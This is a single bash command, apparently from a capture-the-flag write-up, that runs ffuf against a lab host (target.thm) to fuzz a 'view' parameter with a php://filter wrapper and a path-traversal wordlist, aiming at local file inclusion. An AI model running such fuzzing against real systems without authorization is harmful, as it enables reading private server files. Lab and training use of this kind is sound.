```bash
ffuf -u "http://target.thm/test.php?view=php://filter/resource=/var/www/html/development_testingFUZZ" \  
-w traversals-8-deep-exotic-encoding.txt \  
-t 50 \  
-timeout 5 \  
-fs 538,514,513
```